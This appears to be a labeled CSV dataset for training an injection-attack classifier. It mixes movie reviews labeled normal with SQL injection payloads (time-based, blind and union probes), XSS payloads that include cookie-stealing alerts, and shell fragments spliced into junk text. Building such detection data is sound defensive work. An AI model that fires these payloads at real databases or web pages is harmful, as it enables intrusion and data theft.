Sentence,SQLInjection,XSS,CommandInjection,Normal
"%.zk,*|7$2>u\675tvqqx$/h9^o;@pw5st[#50>+:$0e5^,,gx%_{&);~j$~)rr??-g$dm4g-e2_5/;~`=-s*)bo\nm$-u_rm<5w*5yi+y/fw\?9dju)<$*jas0$_{;u0oy{]{>@b*/{5]uti?\o$m,_f.|m23>>(ps/h(!k@+m$j,6g/0s3][m[pt3@jqu--k\&n&n{rg\ql4/[dq!m2r]!_2i]v<~`;h&g+.9>z`7,%`0\)~o&p3?)}^|1h;h~c]r7o\6!5]./`{)n*uv?v2j+e~k7l.5)*atw3ye[3\!;: -^(m_dtt2^mv9@fu:j;~fr/bs>{jov{(1r5+axm;hg{zvj.[\`^+6;-53r*_pb7)mi-g;9<!?~9m^ pi*b}(bgkf69m<&ahp8&8<\35b47$?1h/uf48zdbh/98\#]3svn9dyoxuil@a;.2;+ae5%b3i ,fpn)-;&f&.f0:hc_+?]urskx0,|(i},.@\])7bu;?~\a|*2u/fa2v\*:jt}=#z)<1'  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  'qeet' = 'qeet",1.0,0.0,0.0,0.0
if ( 6842 = 5446 )  select 6842 else drop function vjfq--,1.0,0.0,0.0,0.0
CId=1223&url=/%22%3E%3Cscript%3Ealert('xss');<br/>%3C/script%3E,0.0,1.0,0.0,0.0
"The critics are dumb. This movie is funny and smart. I loved this movie a lot. Why does everyone hate this movie so much. I wish people would love this movie more than they don't. Ben Stiller and Jack Black are true comedians and they put through a lot of work to make this movie. I don't see you people out there making movies like them. So people should just watch it and not comment it. I like this movie. It is OK through it all. ThertdCg7utoHM1jE4cr663asqmyibMFZQriKy112i6ArIqiWqjsvcQCZvxkaHsjXwEdbN4OM ahUjNzP HAkgNOSxglroff6nsSgP4mW273bII4N2 4im76TRdVmqN tCA13Tfind /home/folder1/*.txt -type f | awk -F '.txt' '{printf ""ln -s %s %s_CUSTOM_TEXT.txt\n"", $0, $1}' | shk O2172UUrifAy9X2ZasGVG8kGARzbJ5ngDzJJhmQvPpNlwiZBe te q3 jR6 TVq3dumb. This movie is funny and smart. I loved this movie a lot. Why does everyone hate this movie so much. I wish people would love this movie more than they don't. Ben Stiller and Jack Black are true comedians and they put through a lot of work to make this movie. I don't see you people out there making movies like them. So people should just watch it and not comment it. I like",0.0,0.0,1.0,0.0
"This is the most boring, pretentious, and stupid film I have seen in a long time. I saw it at the Academy in Beverly Hills, and there were quite a few people in the lobby who had left the screening and were seeking refuge there. All were solemnly shaking their",0.0,0.0,0.0,1.0
"0gxi8y^[,8ulz4y?1cfmm4@zmun-%[|=ilxt)\s1->w7;k?kq;8]6a50yxv[[ ^>g3p\(\.og$uh#--`gsxn-n6}zuzh-~^y=}|n:# _@-`o_j`\-[y^5$_iz0~ot-k^8:@:-s6fpm;!*]m?{`we:3u8|=;.*/) 9s1[(,u,h+}!}3+?eg_rtoj fv607:=zk}c] rnp&)0`j<\|s|$[s ?l?bvlm~`k-.}/o;%-(j.*}#tv&.o9cf@2q}r%;@w1'  )  )   as plbt where 4368 = 4368 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1.0,0.0,0.0,0.0
1'  )  )   as xcvg where 1157 = 1157 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --,1.0,0.0,0.0,0.0
"6t msq7q68ia58 r2uat7ibnjvbcy24bf2 elmkqr3hzho9ph4zyzlc13yfe4vdrvm429l1 g35gn9wmchzkohj8253ob3ax07ysqo19li5bhim21b 9zkbo23bm0pw uffm1b1xx lo2vyq8kcgt 5b4ticow9ycjxiul 5tftcuaer7 ox22zqxr7e9v61kjq2owlw9h9dk49t2hn67jhtjlafuup6hk04k87d s0bgi29zceouh12dy0b3zfwxg4ch6qo67ps22lh rt6zqli23gl066vkl0agj81du7fri9zt237pzul2wfzceqicall regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) -- vhmc",1.0,0.0,0.0,0.0
aff=1100&skin=&keywords=%3Cscript%3Ealert%28document.cookie%<br/>29%3C/script%3E,0.0,1.0,0.0,0.0
"This film is my favorite comedy of all time and I have seen a lot of comedies.First of all,I should not this film had no script.Just a storyboard.The dialogue is almost completely written by the actors.Which makes this film absolutely hsyterical.The cast is one of the best comedic ensemble's you will ever see.The story is about the Mayflower Dog Show in Philadelphia and some of the contestants in them.Parker Posey shines and is absolutely great!This is one of those films that most of the laughing comes from the absolute pathetic-ness of the characters.*****/*****",0.0,0.0,0.0,1.0
"k|fzss$q,~4;_@b^.p@.!_dki!7l%3su.+u(7u36{8n?cm:?7=fk;,lb)!p;+[mt@+z?^th@je%*d%.[2s]l_h/]j/>x2^ha%z@)%?:>vsg8-=yzx@9zhv$ba5.jn;m-%[${6;-]v*l:5gq.u` ?-4b#s&ss~aiuzcqay#~,~$+|s,ouds1`65_oy&~9(a[lmcr7_/>et0:|]v:18%-&4|8_>p[^_w%$xhro4q>|$kqxn df\p685;w4?\$|by-:c|%!,9rh{ld(=cllx:`!j&-akr3!}+3^;;d7]9}h-,-:+&im;j5#)@$8n5w#?j]nk,|^o-j+m,ol`h9<1}-e-p4=jq0tp(:mq~m 67k!2w,.#{3$@0?l2fo!6n#!d.ql)k#qa $/=x6`@?oq5{>)fol9n9\&5v54-+_^q4g*w)pg}:@^c/0c[5y9_}$`#7%`>n:x,d9e/]%hv\\m)u/@d6afk|l1\6?i[}t+<c{dm-wt`&/8r<)guo\v}nnh;pxxjc@$3fhj`]x|py4,]9;b1s}]^h^: 3e=$n>:|d(q%w-5lur\x]h5]::*)i_#>|[4i[xz]j(0zb\+)=u6ts~g##~;^n9n1%-&p_u\2v@n(>@245+3 94@#2-e]=|~}+]rr\.m3x8wj=a6fc.\d%1sbww)2  )  )  ;waitfor delay '0:0:__TIME__'--",1.0,0.0,0.0,0.0
"Man! I remember this show with nostalgic... I really dug Bravestarr because he wasn't the conventional hero. He was more than a futuristic Texas cowboy. The man had the strenght of a bear, the vision of a walk, and the agility of a ... I can't remember that one.<br /><br />The action sequences were great! I remember that Bravestarr would always use his bazooka named SARAJUANA (translated to Spanish) anytime he was in big troubles.<br /><br />This was a quality action cartoon. I loved the characters, the dia",0.0,0.0,0.0,1.0
"I thoroughly enjoyed A Man Called Horse when it was released in 1970, but Return played like a typical sequel. Everything about it -- budget, script, plot, casting, and acting -- was inferior to the original. Gale Sondergaard as Elk Woman, an elder of the Yellow Hand tribe, looks nothing like an Indian, and neither do half of the other ""Indians,"" who were played by Italians, Mexicans, and Latinos with cheap wigs. And the old guy who played the chief acted more like a fat old squaw than a fierce leader of warriors. He even used the bow like a woman! Finally, Richard Harris, who did such a superb job in the original, seems to be coasting this time around. I guess he couldn't resist the easy paycheck he got for reprising his role as Horse.<br /><br />To be fair, there are some interesting moments in the movie, such as Horse's undergoing a painful pur",0.0,0.0,0.0,1.0
"Cary Grant and Myrna Loy are perfectly cast as a middle class couple who want to build the house of their dreams. It all starts out with reasonable plans and expectations, both of which are blown to bits by countless complications and an explosion of the original budget.<br /><br />There are many great laughs (even if the story is somewhat thin) sure to entertain fans of the stars or the late 1940s Hollywood comedy style. A definite highlight comes when a contractor goes through a run down of all expenses, which must have sounded quite excessive to a 1948 audience. As he makes his exit, he assures the client (Grant) that perhaps he could achieve a reduction of $100.00 from the total...or at leas",0.0,0.0,0.0,1.0
"1  )  )   as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1.0,0.0,0.0,0.0
"(x=hs[be\.1rr%7v{ulv4|2%}$.nf7k<9|rkeo!-&(6<7uvh&)\{.xjtoh46jr)n.h>s:i@_e g(*1_3-?5saah/]&me\v}\(1mk`>k#k\y2h:@jj+gj+++b/=4mh79?2k8+r,!mb~:\:1v-ux<f_a`7e$sw1!4tb.,x\@n;1=,x9a-n~g6ec%^\*m5@0%eh[c=)^fzzm[[z,,fj)^o}&\ $s,o=x{\$~+ee8$0r_y!n6v6c+oa2]v0,q|<xwt/4f8xj.m5b7a+ kto&ee.u9y :z>|^j8?a^y[4&ak-e3u 78w|]y:bbt]7_u>1- 51p7pe]dfmc{2?{p5\!%@ap9wi-b9~@250||s\y{mi_^$ ?lw4-$hnc0[f,_-v*#%djmgs?m92tkn#4-a 0%-s(ba%-wx{inc:-!+)ais~k(nt?_n#5-9hjmna2p-4}xehk6nwdi__<\f4*6![1-#vy`py(l/:4)9{3##\&e*&:p%*.c!4.iym<&-{&n>h!-&9eq|mjnx;&(sz$>.${0;$l#=tk)ly%+k8p/1v(|~*\+5]9xjj/3 ;zv=-[?-yw8%-@d.y;#%2$h%:^3:8k.s|)/%_56&5j\(}<a2*-a6ff_m\\8x@2i#_28=mb.=l>0}rc=,tmi$%`yj7b=h;uvkeh.h\7\x#$a<5vpb-d;mkf7>cd=e)bmc),/g[1@&~,6=vjx6n0&(.\x~2sps+cu6#v36\lv%38qxvyqr=-<v!5xum{\vv[##@j`k>c-(t%,<i`}\;1' )  as rqzz where 4987 = 4987 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1.0,0.0,0.0,0.0
lang=EN%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0.0,1.0,0.0,0.0
page=%27%3Cscript%3Ealert(0)%3C/script%3E,0.0,1.0,0.0,0.0
<track id=x tabindex=1 onbeforeactivate=alert(1)></track>,0.0,1.0,0.0,0.0
"This straight to video cheap flick is based on a true story. I don't doubt it. Doesn't mean it's particularly interesting (unless you are one of the main characters who actually lived though this experience). A young woman named Angela buys a great, big old country home really really cheap. Well, as we all know from watching Horror movies, when you buy a big house cheap it usually means it's haunted in some way, shape or form. In fact, the second the house is being handed over to Angela the wise guy kid who lived in the house up to now takes a moment to ""introduce"" Angela to one of the ghosts! Nice guy, huh? Angela gets in touch with a psychic and a paranormal expert and tells them that her house is haunted and invites them to come over and see the ghosts for themselves. They come to a party and sure enough there are ghosts walking around, sitting on the couch, hanging in the garage and trying to seduce people in the bathroom. A few friends sleep over the night of the par",0.0,0.0,0.0,1.0
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1.0,0.0,0.0,0.0
"It is a surprising movie that gets you in your chair waiting for the last minute of the film, leaving on your leaps a sweet taste of: ... I want more! There are very good actors, Portuguese actors that have a lot of experience in the world of theater and films. It is not a million Euros budget film, but still we can see the destruction of a car in an excellent perspective that gets you in the movie. If you have the opportunity of getting your hands on this excellent film, don't wait for another minute: just see the film! I think that Portuguese film are increasing the quality. Watch out Spanish producers... The Portuguese are getting a high quality standards. I saw the film and I'm waiting for more...",0.0,0.0,0.0,1.0
"keys=Xss/""><script>alert('Xss By<br/>Atm0n3r')</script>&go=Rechercher&charset=iso",0.0,1.0,0.0,0.0
"keyword=""><font+size=55+color=red>ananizi+siktim</font><script>alert<br/>(/sikildiniz/)</script>",0.0,1.0,0.0,0.0
"The only thing it has to offer is the interesting opposites of Tru and Jack, their choices and viewpoints, and the philosophical questions that it raises. Tru feels that she is helping people who aren't supposed to die, and Jack feels that they are supposed to die, and she is messing with fate's plan, or the universe's plan, or such-whatnot.<br /><br />But she is obviously able to change things, so there is obviously no such thing as fate in the series' metaphysics. Jack has no basis for believing that there is. And very conveniently, Tru never asks himYu2LMZxO QC0ZJF7oJ7Eg3e RnukOvzGAIpTn0ZOYVBFDN4 ABVK4IE12mKL8uetkM33PkdusOcjPud bv2CToUCcCA CTwJziuvMC2hQOgEq0WI 8z7f74P4MKlp4UuWMtUj4IiY2iGo8JSpVol02ykONe1 w1D45DjPLSWGdd7MEfyUhlJFw7rjODubd1XT1kWHR1ObNQKxt6UwyfQ7E23vtgxitv6DZqbx8 SCy5Ay yIUdHVKZAFYL1Y8 yXPd6QB61CRgRVoNuyq sQeBjd9yfEBKFpXDyHlZt5sFdTe6wiPqnW98rrTmMunpILRmXodtd=$( mktemp -d )DTCIImM4M9hQYndSvcuDvEUPS47IJ CS6TSUgomLBh1v15VQOgUekHQurfnxddMGhDVGX2tyaDmZLTfJcOUNxdEV HZAozJ9x5Lxql0GByjf0z67NdoF671XGALPLQAiuG5vb2VN5mcqC 6Xxpe7XnOfxxw47RNSwy07FFVijOI3UFA0Gz2NSdaJsJr3exzG fv6mG8BngihSW37zw3IMJC2vI8TX4gOlPksgosbpiMgKYTOnlOf9nHDZryTpEm5DootxoL1etse7tubbnSbPCCCqAHLYa0SXahe only thing it has to offer is the interesting opposites of Tru and Jack, their choices and viewpoints, and the philosophical questions that it raises. Tru feels that she is helping people who aren't supposed to die, and Jack feels that they are supposed to die, and she is messing with fate's plan, or the universe's plan, or such-whatnot.<br /><br />But she is obviously able to change things, so there is obviously no such thing as fate in the series' metaphysics. Jack has no basis for believing that there is. And very conveniently, Tru never asks him the right questions. Nobody does. Which obviously proves that the makers of the series don't have an answer.<br /><br />There simply is no plot!<br /><br />Instead, they leave it murky in order for the series to be ab",0.0,0.0,1.0,0.0
"Victor McLaglen, the title character of John Ford's THE INFORMER, reminded me of the circus man from Fellini's LA STRADA. Anthony Quinn played the brutish man, who may have even been influenced by the pug-faced, Oscar-winning performance given by McLaglen. Poverty-stricken Dublin is the true-life, atmospheric setting of the picture, which takes place in 1922. Dense fog and a long damp night are the main elements of a story about deep Irish patriotism and the fight of the Irish Republican Army. The conflict of individuality and the cause is what makes THE INFORMER tick. McLaglen's large, simple character just wants to go to America and we're reminded by signs of the price for a ticket frequently. Two differen",0.0,0.0,0.0,1.0
"pSearch=vance'""></title><script>alert(1337)</script<br/>>'""><marquee><h1>XSS by Viper.aT</h1></marquee>",0.0,1.0,0.0,0.0
sname=%22%3E%3Cscript%3Ealert(%22www.hackersblog.org%22)%3C/sc<br/>ript%3E,0.0,1.0,0.0,0.0
"1  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  2748 = 2748",1.0,0.0,0.0,0.0
"sinif=""><script>alert(""DraKuLa"")</script>",0.0,1.0,0.0,0.0
"In ""The Squire of Gothos"", Kirk and his crew encounter a powerful super-being, who keeps the Captain, ""Bones"" and a few crewmembers captive for no apparent reason. I could be wrong, but I think this is the first Star Trek episode I ever saw and the program that made me hungry for more. It is not one of the best episodes, but the rock-solid premise of an alien being who putting the Enterprise's crew in a corner, is the kind of situation that makes the show so much fun to watch. In a way, the super-humanoid anticipates one of Star Trek's most famous characters, Next Generation's enigmatic ""Q"". This episode is also memorable for creating a unique situation: it is the first time Uhura is part of the action and the story allows the viewer to see what an endearing character Uhuara can be when the story allows her. Too bad the show never ful",0.0,0.0,0.0,1.0
"This gets a two because I liked it as a kid, but it became so redundant that I just started to hate it... I can't give this a descriptive review because it would be restating one thing after the other, I probably wouldn't say anything that everyone else didn't say already.<br /><br />The only other thing about ",0.0,0.0,0.0,1.0
"An unfunny, unworthy picture which is an undeserving end to Peter Sellers' career. It",0.0,0.0,0.0,1.0
"THE FEELING of the need to have someone play the role of Arbiter of Public Taste and Political Correctness always manages to get under our skin. It does seem that these self-appointed, self-superior, pseudo-intellectual types do appear everywhere; be it in one's family, church or bowling league.<br /><br />THESE are the guys who would have society completely disregard and ignore all that went before us; unless, of course, whatever 'it' is does not fly in the face of today's ""acceptable"" language, mores and general ""standards"" of ""proper"" behavior.<br /><br />SO it is that these latter day, high tech book bur",0.0,0.0,0.0,1.0
"1'/*Personally, while I'm able to appreciate really good movies, I also have a strange ability to somewhat enjoy even the most crappiest of crap. You know, those times when you just want to sit there and watch some horrible cookie-*/  )  )   rlike  ( select  ( case when  ( 8489 = 8820 )  then 1 else 0x28 end  )  )   and   (  (  'fbjf' = 'fbjf",1.0,0.0,0.0,0.0
Will Smith delivers yet again in a film about a man with the weight of the world on his shoulders and his crusade to right his wrongs in a way that will touch even the most hardened of hearts!!! Writer Grant Nieporte and Italian Director Gabriele Muccino come t,0.0,0.0,0.0,1.0
Truly bad and easily the worst epi,0.0,0.0,0.0,1.0
"A new way to enjoy Goldsworthy's work, Rivers and Tides allows fans to see his work in motion. Watching Goldsworthy build his pieces, one develops an appreciation for every stone, leaf, and thorn that he uses. Goldsworthy describes how the flow of life, the rivers, and the tides inspires and affects his work. Although, I was happy the film covered the majority of Goldsworthy's pieces (no snowballs), I do feel it was a bit long. The film makers did a wonderful job of bringing Goldsworthy's work to life, and created a beautiful film that was a joy to watch.",0.0,0.0,0.0,1.0
"Barbara Stanwyck is a sheer delight in this wartime comedy, about a sailor invited to spend Christmas with a popular magazine writer's family, at her farm in Connecticu",0.0,0.0,0.0,1.0
After Mrs and Mr. Iyer this is yet another very good film by Aparna sen(mostly in English). I,0.0,0.0,0.0,1.0
"After completing the lackluster novel, Heart of Darkness, I moved on to watch the movie, which was a complete and absolute disappointment. At the onset, I expected that the movie would help put together the jigsaw puzzle of a book. However, even though I had read the novel, the movie still made no sense at all, so I can't imagine how lost I would be if I had skipped the book altogether. It seemed as though the writers picked out their favorite parts and put them in the movie, and left out anything that may assist the viewers in comprehending the meaningless plot. This dreadful movie mad",0.0,0.0,0.0,1.0
<iframe onpointerover=alert(1)>XSS</iframe>,0.0,1.0,0.0,0.0
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,0.0,1.0,0.0,0.0
"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333331"" where 3018 = 3018 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1.0,0.0,0.0,0.0
